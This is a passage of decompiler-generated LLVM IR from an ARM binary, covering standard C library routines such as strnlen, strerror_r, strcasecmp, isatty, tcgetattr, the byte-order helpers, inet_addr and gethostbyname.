dec_label_pc_dad0:                                ; preds = %dec_label_pc_dac8, %dec_label_pc_da9c
  %v2_dad810 = phi i32 [ %v1_da9c, %dec_label_pc_da9c ], [ %v6_dac0, %dec_label_pc_dac8 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_dad4

dec_label_pc_dad4:                                ; preds = %dec_label_pc_dad4.dec_label_pc_dad4_crit_edge, %dec_label_pc_dad0
  %v2_dad8 = phi i32 [ %v6_dad8, %dec_label_pc_dad4.dec_label_pc_dad4_crit_edge ], [ %v2_dad810, %dec_label_pc_dad0 ]
  %v0_dad8.off0 = phi i8 [ %extract.t, %dec_label_pc_dad4.dec_label_pc_dad4_crit_edge ], [ 0, %dec_label_pc_dad0 ]
  %v0_dad4 = load i32, i32* %r3.global-to-local, align 4
  %v1_dad4 = add i32 %v0_dad4, -1
  store i32 %v1_dad4, i32* %r3.global-to-local, align 4
  %v7_dad4 = icmp eq i32 %v0_dad4, 1
  store i1 %v7_dad4, i1* %cpsr_z.global-to-local, align 1
  %v3_dad8 = add i32 %v2_dad8, 1
  %v4_dad8 = inttoptr i32 %v3_dad8 to i8*
  store i8 %v0_dad8.off0, i8* %v4_dad8, align 1
  %v5_dad8 = load i32, i32* @ip, align 4
  %v6_dad8 = add i32 %v5_dad8, 1
  store i32 %v6_dad8, i32* @ip, align 4
  %v0_dadc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dadc, label %dec_label_pc_dae0, label %dec_label_pc_dad4.dec_label_pc_dad4_crit_edge

dec_label_pc_dad4.dec_label_pc_dad4_crit_edge:    ; preds = %dec_label_pc_dad4
  %v0_dad8.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_dad8.pre to i8
  br label %dec_label_pc_dad4

dec_label_pc_dae0:                                ; preds = %dec_label_pc_dab8, %dec_label_pc_dad4, %dec_label_pc_da9c, %dec_label_pc_dab0
  %v2_dae0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_dae0, i32* @lr, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_dad8, { 1, 0 }
  uselistorder i32 %v0_dad4, { 1, 0 }
  uselistorder i32 %v6_dac0, { 0, 2, 1 }
  uselistorder i32 %v1_dab0, { 2, 1, 0 }
  uselistorder i32 %v2_daa0, { 1, 0 }
  uselistorder i32 %v1_da90, { 1, 0 }
  uselistorder i32 %v0_da8c, { 1, 0 }
  uselistorder i32 %v6_da80, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_dae0, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_dab8, { 1, 0 }
}

define i32 @strnlen(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_dae8 = icmp eq i32 %arg2, 0
  br i1 %v2_dae8, label %bb, label %dec_label_pc_dafc

bb:                                               ; preds = %entry
  br label %bb25

dec_label_pc_dafc:                                ; preds = %entry
  %v2_dafc = add i32 %tmp, %arg2
  %v3_dafc = icmp ult i32 %v2_dafc, %tmp
  br i1 %v3_dafc, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_dafc
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_dafc, %bb19
  %v5_db9c = phi i32 [ %v2_dafc, %dec_label_pc_dafc ], [ -1, %bb19 ]
  %v1_db1c4 = urem i32 %tmp, 4
  %v2_db1c5 = icmp eq i32 %v1_db1c4, 0
  br i1 %v2_db1c5, label %dec_label_pc_db24, label %dec_label_pc_db0c

dec_label_pc_db0c:                                ; preds = %bb20, %dec_label_pc_db18
  %v0_db18 = phi i32 [ %v1_db18, %dec_label_pc_db18 ], [ %tmp, %bb20 ]
  %v1_db0c = inttoptr i32 %v0_db18 to i8*
  %v2_db0c = load i8, i8* %v1_db0c, align 1
  %v2_db10 = icmp eq i8 %v2_db0c, 0
  br i1 %v2_db10, label %dec_label_pc_db98, label %dec_label_pc_db18

dec_label_pc_db18:                                ; preds = %dec_label_pc_db0c
  %v1_db18 = add i32 %v0_db18, 1
  %v1_db1c = urem i32 %v1_db18, 4
  %v2_db1c = icmp eq i32 %v1_db1c, 0
  br i1 %v2_db1c, label %dec_label_pc_db24, label %dec_label_pc_db0c

dec_label_pc_db24:                                ; preds = %dec_label_pc_db18, %bb20
  %storemerge.lcssa = phi i32 [ %tmp, %bb20 ], [ %v1_db18, %dec_label_pc_db18 ]
  %v3_db8830 = icmp ult i32 %storemerge.lcssa, %v5_db9c
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_db8830, label %dec_label_pc_db2c, label %dec_label_pc_db98

dec_label_pc_db2c:                                ; preds = %dec_label_pc_db84, %dec_label_pc_db24
  %v0_db7c37 = phi i32 [ %v4_db2c, %dec_label_pc_db84 ], [ %storemerge.lcssa, %dec_label_pc_db24 ]
  %v1_db2c = inttoptr i32 %v0_db7c37 to i32*
  %v2_db2c = load i32, i32* %v1_db2c, align 4
  %v4_db2c = add i32 %v0_db7c37, 4
  %v2_db30 = add i32 %v2_db2c, -16843009
  %v2_db34 = and i32 %v2_db30, -2139062144
  store i32 %v2_db34, i32* @ip, align 4
  %v2_db38 = icmp eq i32 %v2_db34, 0
  br i1 %v2_db38, label %dec_label_pc_db84, label %dec_label_pc_db40

dec_label_pc_db40:                                ; preds = %dec_label_pc_db2c
  %v2_db40 = inttoptr i32 %v0_db7c37 to i8*
  %v3_db40 = load i8, i8* %v2_db40, align 1
  %v2_db44 = icmp eq i8 %v3_db40, 0
  br i1 %v2_db44, label %bb21, label %dec_label_pc_db54

bb21:                                             ; preds = %dec_label_pc_db40
  br label %dec_label_pc_db98

dec_label_pc_db54:                                ; preds = %dec_label_pc_db40
  %v1_db54 = add i32 %v0_db7c37, 1
  %v2_db54 = inttoptr i32 %v1_db54 to i8*
  %v3_db54 = load i8, i8* %v2_db54, align 1
  %v2_db58 = icmp eq i8 %v3_db54, 0
  br i1 %v2_db58, label %dec_label_pc_db98, label %dec_label_pc_db64

dec_label_pc_db64:                                ; preds = %dec_label_pc_db54
  %v1_db64 = add i32 %v0_db7c37, 2
  %v2_db64 = inttoptr i32 %v1_db64 to i8*
  %v3_db64 = load i8, i8* %v2_db64, align 1
  %v2_db68 = icmp eq i8 %v3_db64, 0
  br i1 %v2_db68, label %dec_label_pc_db98, label %dec_label_pc_db74

dec_label_pc_db74:                                ; preds = %dec_label_pc_db64
  %v1_db74 = add i32 %v0_db7c37, 3
  %v2_db74 = inttoptr i32 %v1_db74 to i8*
  %v3_db74 = load i8, i8* %v2_db74, align 1
  %v2_db78 = icmp eq i8 %v3_db74, 0
  br i1 %v2_db78, label %dec_label_pc_db98, label %dec_label_pc_db84

dec_label_pc_db84:                                ; preds = %dec_label_pc_db74, %dec_label_pc_db2c
  %v3_db88 = icmp ult i32 %v4_db2c, %v5_db9c
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_db88, label %dec_label_pc_db2c, label %dec_label_pc_db98

dec_label_pc_db98:                                ; preds = %dec_label_pc_db84, %dec_label_pc_db24, %dec_label_pc_db0c, %dec_label_pc_db54, %dec_label_pc_db64, %dec_label_pc_db74, %bb21
  %v1_db98 = phi i32 [ %v0_db7c37, %bb21 ], [ %storemerge.lcssa, %dec_label_pc_db24 ], [ %v1_db54, %dec_label_pc_db54 ], [ %v1_db64, %dec_label_pc_db64 ], [ %v1_db74, %dec_label_pc_db74 ], [ %v5_db9c, %dec_label_pc_db84 ], [ %v0_db18, %dec_label_pc_db0c ]
  %v3_db98 = icmp uge i32 %v5_db9c, %v1_db98
  %v9_db98 = icmp eq i32 %v5_db9c, %v1_db98
  %v2_db9c = xor i1 %v3_db98, true
  %v3_db9c = or i1 %v9_db98, %v2_db9c
  br i1 %v3_db9c, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_db98
  %v6_db9c = sub i32 %v5_db9c, %tmp
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_db98, %bb22
  %v5_dba0 = phi i32 [ %v1_db98, %dec_label_pc_db98 ], [ %v6_db9c, %bb22 ]
  %v2_dba0 = xor i1 %v9_db98, true
  %v3_dba0 = and i1 %v3_db98, %v2_dba0
  br i1 %v3_dba0, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  %v6_dba0 = sub i32 %v5_dba0, %tmp
  br label %bb25

bb25:                                             ; preds = %bb, %bb23, %bb24
  %v1_dba8 = phi i32 [ 0, %bb ], [ %v5_dba0, %bb23 ], [ %v6_dba0, %bb24 ]
  ret i32 %v1_dba8

; uselistorder directives
  uselistorder i1 %v3_db98, { 1, 0 }
  uselistorder i32 %v4_db2c, { 1, 0 }
  uselistorder i32 %v0_db7c37, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_db18, { 1, 0, 2 }
  uselistorder i32 %v5_db9c, { 3, 4, 5, 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 1, 3, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 2, 1, 0 }
  uselistorder label %bb25, { 2, 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_db98, { 0, 5, 4, 3, 6, 1, 2 }
  uselistorder label %dec_label_pc_db0c, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_dbbc = call i32 @__xpg_strerror_r()
  %v0_dbc0 = load i32, i32* @r4, align 4
  ret i32 %v0_dbc0
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_dbcc = load i32, i32* @r4, align 4
  %v9_dbcc = load i32, i32* @r6, align 4
  %v0_dbd4 = load i32, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r6, align 4
  store i32 %v0_dbd4, i32* @ip, align 4
  %v0_dbe4 = load i32, i32* @r1, align 4
  store i32 %v0_dbe4, i32* @r7, align 4
  %v0_dbe8 = load i32, i32* @r2, align 4
  store i32 %v0_dbe8, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_dbd4, 124
  br i1 %tmp, label %dec_label_pc_dc20, label %dec_label_pc_dbf0

dec_label_pc_dbf0:                                ; preds = %entry
  br label %dec_label_pc_dc08

dec_label_pc_dbfc:                                ; preds = %dec_label_pc_dc08
  br i1 %v2_dc14, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_dbfc
  %v2_dc00 = add i32 %v1_dc18, -1
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_dbfc, %bb
  %v0_dc081 = phi i32 [ %v1_dc18, %dec_label_pc_dbfc ], [ %v2_dc00, %bb ]
  %v1_dc04 = add i32 %v0_dc04, 1
  br label %dec_label_pc_dc08

dec_label_pc_dc08:                                ; preds = %dec_label_pc_dbf0, %bb15
  %v1_dc18 = phi i32 [ %v0_dbd4, %dec_label_pc_dbf0 ], [ %v0_dc081, %bb15 ]
  %v0_dc04 = phi i32 [ add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 -37956), %dec_label_pc_dbf0 ], [ %v1_dc04, %bb15 ]
  store i32 %v0_dc04, i32* @r5, align 4
  %v2_dc08 = icmp eq i32 %v1_dc18, 0
  %v1_dc0c = inttoptr i32 %v0_dc04 to i8*
  %v2_dc0c = load i8, i8* %v1_dc0c, align 1
  %v3_dc0c = zext i8 %v2_dc0c to i32
  store i32 %v3_dc0c, i32* @r3, align 4
  %v2_dc14 = icmp eq i8 %v2_dc0c, 0
  br i1 %v2_dc08, label %dec_label_pc_dc14, label %dec_label_pc_dbfc

dec_label_pc_dc14:                                ; preds = %dec_label_pc_dc08
  br i1 %v2_dc14, label %dec_label_pc_dc20, label %bb16

bb16:                                             ; preds = %dec_label_pc_dc14
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_dc5c

dec_label_pc_dc20:                                ; preds = %dec_label_pc_dc14, %entry
  store i32 %v0_dbd4, i32* @r2, align 4
  %v3_dc28 = ashr i32 %v0_dbd4, 31
  store i32 %v3_dc28, i32* @r3, align 4
  %v6_dc3c = bitcast i32* %stack_var_-25 to i8*
  %v7_dc3c = call i32 @_uintmaxtostr(i8* %v6_dc3c)
  %v1_dc44 = add i32 %v7_dc3c, -14
  store i32 %v1_dc44, i32* @r5, align 4
  %v0_dc48 = load i32, i32* @r6, align 4
  %v2_dc48 = add i32 %v0_dc48, -37972
  store i32 %v2_dc48, i32* @r1, align 4
  store i32 %v1_dc44, i32* @r0, align 4
  store i32 14, i32* @r2, align 4
  %v0_dc54 = call i32 @memcpy()
  store i32 22, i32* %r6.global-to-local, align 4
  %v0_dc5c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_dc5c

dec_label_pc_dc5c:                                ; preds = %bb16, %dec_label_pc_dc20
  %v0_dc5c = phi i32 [ %v0_dc04, %bb16 ], [ %v0_dc5c.pre, %dec_label_pc_dc20 ]
  %v1_dc5c = inttoptr i32 %v0_dc5c to i8*
  %v3_dc60 = call i32 @strlen(i8* %v1_dc5c)
  %v0_dc64 = load i32, i32* @r7, align 4
  %v2_dc64 = icmp eq i32 %v0_dc64, 0
  br i1 %v2_dc64, label %bb17, label %dec_label_pc_dc5c._crit_edge

dec_label_pc_dc5c._crit_edge:                     ; preds = %dec_label_pc_dc5c
  %v1_dc70.pre = load i32, i32* @r4, align 4
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_dc5c
  store i32 0, i32* @r4, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_dc5c._crit_edge, %bb17
  %v1_dc70 = phi i32 [ %v1_dc70.pre, %dec_label_pc_dc5c._crit_edge ], [ 0, %bb17 ]
  %v1_dc6c = add i32 %v3_dc60, 1
  %v3_dc70 = icmp uge i32 %v1_dc6c, %v1_dc70
  %v9_dc70 = icmp eq i32 %v1_dc6c, %v1_dc70
  %v2_dc74 = xor i1 %v3_dc70, true
  %v3_dc74 = or i1 %v9_dc70, %v2_dc74
  br i1 %v3_dc74, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 %v1_dc6c, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  %v0_dc84 = phi i32 [ %v1_dc70, %bb18 ], [ %v1_dc6c, %bb19 ]
  %v2_dc78 = xor i1 %v9_dc70, true
  %v3_dc78 = and i1 %v3_dc70, %v2_dc78
  br i1 %v3_dc78, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 34, i32* %r6.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v2_dc7c = icmp eq i32 %v0_dc84, 0
  br i1 %v2_dc7c, label %dec_label_pc_dca0, label %dec_label_pc_dc84

dec_label_pc_dc84:                                ; preds = %bb22
  store i32 %v0_dc84, i32* @r2, align 4
  %v0_dc88 = load i32, i32* @r5, align 4
  store i32 %v0_dc88, i32* @r1, align 4
  store i32 %v0_dc64, i32* @r0, align 4
  %v0_dc90 = call i32 @memcpy()
  %v0_dc94 = load i32, i32* @r4, align 4
  %v1_dc94 = load i32, i32* @r7, align 4
  %v2_dc94 = add i32 %v1_dc94, %v0_dc94
  %v3_dc9c = add i32 %v2_dc94, -1
  %v4_dc9c = inttoptr i32 %v3_dc9c to i8*
  store i8 0, i8* %v4_dc9c, align 1
  br label %dec_label_pc_dca0

dec_label_pc_dca0:                                ; preds = %bb22, %dec_label_pc_dc84
  %v0_dca0 = load i32, i32* %r6.global-to-local, align 4
  %v2_dca0 = icmp eq i32 %v0_dca0, 0
  br i1 %v2_dca0, label %dec_label_pc_dcb8, label %dec_label_pc_dca8

dec_label_pc_dca8:                                ; preds = %dec_label_pc_dca0
  %v0_dcac = call i32 @__aeabi_read_tp()
  %v3_dcb0 = load i16, i16* @global_var_23164.175, align 2
  %v4_dcb0 = sext i16 %v3_dcb0 to i32
  %v0_dcb4 = load i32, i32* %r6.global-to-local, align 4
  %v3_dcb4 = add i32 %v4_dcb0, %v0_dcac
  %v4_dcb4 = inttoptr i32 %v3_dcb4 to i32*
  store i32 %v0_dcb4, i32* %v4_dcb4, align 4
  %v0_dcb8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_dcb8

dec_label_pc_dcb8:                                ; preds = %dec_label_pc_dca0, %dec_label_pc_dca8
  %v0_dcb8 = phi i32 [ 0, %dec_label_pc_dca0 ], [ %v0_dcb8.pre, %dec_label_pc_dca8 ]
  store i32 %v3_dbcc, i32* @r4, align 4
  store i32 %v9_dbcc, i32* %r6.global-to-local, align 4
  ret i32 %v0_dcb8

; uselistorder directives
  uselistorder i1 %v3_dc70, { 1, 0 }
  uselistorder i32 %v0_dc04, { 0, 2, 3, 1 }
  uselistorder i32 %v1_dc18, { 1, 0, 2 }
  uselistorder i32 %v0_dbd4, { 2, 1, 3, 0, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 5, 3, 4, 1, 2, 6 }
  uselistorder label %dec_label_pc_dcb8, { 1, 0 }
  uselistorder label %dec_label_pc_dca0, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_dc5c, { 1, 0 }
  uselistorder label %dec_label_pc_dc08, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @ip, align 4
  br label %dec_label_pc_dcf4

dec_label_pc_dcf4:                                ; preds = %dec_label_pc_dd20, %entry
  %v1_dd388 = phi i32 [ %v1_dd389, %dec_label_pc_dd20 ], [ 0, %entry ]
  %v0_dd28 = phi i32 [ %v1_dd28, %dec_label_pc_dd20 ], [ %arg2, %entry ]
  %v0_dd2c = phi i32 [ %v1_dd2c, %dec_label_pc_dd20 ], [ %tmp, %entry ]
  %v9_dcf4 = icmp eq i32 %v0_dd2c, %v0_dd28
  %.pre = inttoptr i32 %v0_dd2c to i8*
  br i1 %v9_dcf4, label %dec_label_pc_dd20, label %dec_label_pc_dcfc

dec_label_pc_dcfc:                                ; preds = %dec_label_pc_dcf4
  %v2_dcfc = load i8, i8* %.pre, align 1
  %v3_dcfc = zext i8 %v2_dcfc to i32
  %v1_dd00 = inttoptr i32 %v0_dd28 to i8*
  %v2_dd00 = load i8, i8* %v1_dd00, align 1
  %v3_dd00 = zext i8 %v2_dd00 to i32
  %v4_dd04 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 808) to i32*), align 4
  %v2_dd08 = mul nuw nsw i32 %v3_dd00, 2
  %v2_dd0c = mul nuw nsw i32 %v3_dcfc, 2
  store i32 %v2_dd0c, i32* @r1, align 4
  %v2_dd10 = add i32 %v4_dd04, %v2_dd08
  %v3_dd10 = inttoptr i32 %v2_dd10 to i16*
  %v4_dd10 = load i16, i16* %v3_dd10, align 2
  %v6_dd10 = sext i16 %v4_dd10 to i32
  %v2_dd14 = add i32 %v4_dd04, %v2_dd0c
  %v3_dd14 = inttoptr i32 %v2_dd14 to i16*
  %v4_dd14 = load i16, i16* %v3_dd14, align 2
  %v6_dd14 = sext i16 %v4_dd14 to i32
  %v2_dd18 = sub nsw i32 %v6_dd14, %v6_dd10
  %v9_dd18 = icmp eq i16 %v4_dd14, %v4_dd10
  br i1 %v9_dd18, label %dec_label_pc_dd20, label %dec_label_pc_dd34

dec_label_pc_dd20:                                ; preds = %dec_label_pc_dcf4, %dec_label_pc_dcfc
  %v1_dd389 = phi i32 [ %v2_dd18, %dec_label_pc_dcfc ], [ %v1_dd388, %dec_label_pc_dcf4 ]
  %v2_dd20 = load i8, i8* %.pre, align 1
  %v2_dd24 = icmp eq i8 %v2_dd20, 0
  %v1_dd28 = add i32 %v0_dd28, 1
  %v1_dd2c = add i32 %v0_dd2c, 1
  store i32 %v1_dd2c, i32* @ip, align 4
  br i1 %v2_dd24, label %dec_label_pc_dd34, label %dec_label_pc_dcf4

dec_label_pc_dd34:                                ; preds = %dec_label_pc_dd20, %dec_label_pc_dcfc
  %v1_dd38 = phi i32 [ %v1_dd389, %dec_label_pc_dd20 ], [ %v2_dd18, %dec_label_pc_dcfc ]
  ret i32 %v1_dd38

; uselistorder directives
  uselistorder i32 %v1_dd2c, { 1, 0 }
  uselistorder i32 %v2_dd18, { 1, 0 }
  uselistorder i32 %v2_dd0c, { 1, 0 }
  uselistorder i32 %v0_dd2c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_dd20, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 10132), i32* @r2, align 4
  %v0_dd5c = call i32 @strtok_r()
  ret i32 %v0_dd5c
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_dd7c = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_dd7c, i32* @r1, align 4
  %v0_dd80 = call i32 @__GI_tcgetattr()
  %v1_dd84 = sub i32 1, %v0_dd80
  %v2_dd84 = icmp ult i32 %v0_dd80, 2
  br i1 %v2_dd84, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_dd94 = phi i32 [ %v1_dd84, %entry ], [ 0, %bb ]
  ret i32 %v1_dd94

; uselistorder directives
  uselistorder i32 %v0_dd80, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_dd98 = load i32, i32* @r4, align 4
  %v6_dd98 = load i32, i32* @r5, align 4
  %v9_dd98 = load i32, i32* @r6, align 4
  %v2_dda0 = ptrtoint i32* %stack_var_-52 to i32
  %v0_dda4 = load i32, i32* @r1, align 4
  store i32 %v0_dda4, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_ddb0 = load i32, i32* @r0, align 4
  %v3_ddb0 = call i32 @ioctl(i32 %v0_ddb0, i32 21505, i32 %v2_dda0)
  store i32 %v3_ddb0, i32* %r0.global-to-local, align 4
  store i32 %v3_ddb0, i32* @r5, align 4
  %v2_ddb4 = icmp eq i32 %v3_ddb0, 0
  br i1 %v2_ddb4, label %dec_label_pc_ddbc, label %dec_label_pc_de00

dec_label_pc_ddbc:                                ; preds = %entry
  %v4_ddc8 = zext i8 %tmp to i32
  store i32 %v4_ddc8, i32* @ip, align 4
  %v3_ddcc = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_ddcc, i32* @r3, align 4
  %v1_ddd0 = load i32, i32* @r4, align 4
  %v2_ddd0 = add i32 %v1_ddd0, 4
  %v3_ddd0 = inttoptr i32 %v2_ddd0 to i32*
  %v0_ddd4 = load i32, i32* %r1.global-to-local, align 4
  %v1_ddd4 = load i32, i32* @r4, align 4
  %v2_ddd4 = add i32 %v1_ddd4, 8
  %v3_ddd4 = inttoptr i32 %v2_ddd4 to i32*
  store i32 %v0_ddd4, i32* %v3_ddd4, align 4
  %v0_ddd8 = load i32, i32* %r0.global-to-local, align 4
  %v1_ddd8 = load i32, i32* @r4, align 4
  %v2_ddd8 = add i32 %v1_ddd8, 12
  %v3_ddd8 = inttoptr i32 %v2_ddd8 to i32*
  store i32 %v0_ddd8, i32* %v3_ddd8, align 4
  %v2_dddc = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_dddc, i32* @r1, align 4
  %v1_dde4 = load i32, i32* @r4, align 4
  %v2_dde4 = inttoptr i32 %v1_dde4 to i32*
  store i32 %v3_ddcc, i32* %v2_dde4, align 4
  %v0_dde8 = load i32, i32* @ip, align 4
  %v1_dde8 = trunc i32 %v0_dde8 to i8
  %v2_dde8 = load i32, i32* @r4, align 4
  %v3_dde8 = add i32 %v2_dde8, 16
  %v4_dde8 = inttoptr i32 %v3_dde8 to i8*
  store i8 %v1_dde8, i8* %v4_dde8, align 1
  %v0_ddec = load i32, i32* @r4, align 4
  %v1_ddec = add i32 %v0_ddec, 17
  store i32 %v1_ddec, i32* %r0.global-to-local, align 4
  %v4_ddf0 = call i32 @__GI_mempcpy(i32 %v1_ddec, i32 %v2_dddc, i32 19, i32 %v3_ddcc)
  store i32 %v4_ddf0, i32* %r0.global-to-local, align 4
  %v0_ddf4 = load i32, i32* @r5, align 4
  store i32 %v0_ddf4, i32* %r1.global-to-local, align 4
  %v3_ddfc = inttoptr i32 %v4_ddf0 to i8*
  %v4_ddfc = call i32 @__GI_memset(i8* %v3_ddfc, i32 %v0_ddf4, i32 13)
  store i32 %v4_ddfc, i32* %r0.global-to-local, align 4
  %v0_de00.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_de00

dec_label_pc_de00:                                ; preds = %entry, %dec_label_pc_ddbc
  %v0_de00 = phi i32 [ %v3_ddb0, %entry ], [ %v0_de00.pre, %dec_label_pc_ddbc ]
  store i32 %v0_de00, i32* %r0.global-to-local, align 4
  store i32 %v3_dd98, i32* @r4, align 4
  store i32 %v6_dd98, i32* @r5, align 4
  store i32 %v9_dd98, i32* @r6, align 4
  ret i32 %v0_de00

; uselistorder directives
  uselistorder i32 %v0_de00, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_de00, { 1, 0 }
}

define i32 @__GI_htons(i32 %arg1) local_unnamed_addr {
entry:
  %v3_de14 = udiv i32 %arg1, 256
  %v1_de18 = mul i32 %arg1, 256
  %v4_de1c = and i32 %v1_de18, 65280
  %v5_de1c = or i32 %v4_de1c, %v3_de14
  ret i32 %v5_de1c
}

define i32 @__GI_htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_de3c = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_de3c
}

define i32 @__GI_ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v3_de44 = udiv i32 %arg1, 256
  %v1_de48 = mul i32 %arg1, 256
  %v4_de4c = and i32 %v1_de48, 65280
  %v5_de4c = or i32 %v4_de4c, %v3_de44
  ret i32 %v5_de4c
}

define i32 @__GI_ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_de6c = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_de6c
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_de7c = ptrtoint i32* %stack_var_-12 to i32
  %v0_de80 = load i32, i32* @r0, align 4
  %v2_de80 = inttoptr i32 %v0_de80 to i8*
  %v3_de80 = call i32 @inet_aton(i8* %v2_de80, i32 %v2_de7c)
  %v2_de84 = icmp eq i32 %v3_de80, 0
  %v4_de88 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_de84, i32 -1, i32 %v4_de88
  ret i32 %storemerge
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  store i32 2, i32* @r1, align 4
  %v0_dea8 = call i32 @__GI_gethostbyname2()
  ret i32 %v0_dea8
}

define i32 @__GI_gethostbyname2() local_unnamed_addr {
entry:
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v3_deb8 = load i32, i32* @r4, align 4
  %v0_ded4 = load i32, i32* @r0, align 4
  %v3_ded8 = load i32, i32* @global_var_23120.283, align 4
  %v0_dedc = call i32 @__aeabi_read_tp()
  %v2_dee4 = add i32 %v3_ded8, %v0_dedc
  store i32 %v2_dee4, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 10136), i32* @r3, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 10576), i32* @r2, align 4
  %v1_df04 = call i32 @gethostbyname2_r(i32 %v0_ded4)
  store i32 %v3_deb8, i32* @r4, align 4
  ret i32 %tmp4
}

define i32 @function_df20() local_unnamed_addr {
dec_label_pc_df20:
  %v0_df20 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_df20, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_df20
  %v1_df20 = load i32, i32* @r8, align 4
  %v2_df20 = load i32, i32* @r7, align 4
  %v3_df20 = mul i32 %v2_df20, %v1_df20
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_df20, %bb
  %.01 = phi i32 [ %v3_df20, %bb ], [ undef, %dec_label_pc_df20 ]
  ret i32 %.01

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_accept() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_df28 = load i32, i32* @r7, align 4
